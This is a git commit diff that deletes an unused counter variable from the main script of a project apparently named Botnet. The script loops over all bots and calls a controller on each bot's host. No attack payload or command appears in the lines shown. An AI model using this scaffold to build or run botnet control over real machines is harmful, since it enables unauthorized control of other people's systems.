78f7f09bcbe7864f25ffdb557f125949a5f662fb
Marcus <88283829+PyMarcus@users.noreply.github.com>
2023-04-16 22:57:09 -0400

    delete i variable

--- Botnet/main.py
+++ Botnet/main.py
@@ -4,7 +4,6 @@ from botnet import BotnetServer
 
 if __name__ == '__main__':
     bs: BotnetServer = BotnetServer()
-    i = 0
     for bot in bs.get_all_bots():
         bsx: BotnetServer = BotnetServer()
         bsx.general_controller(bot.host,
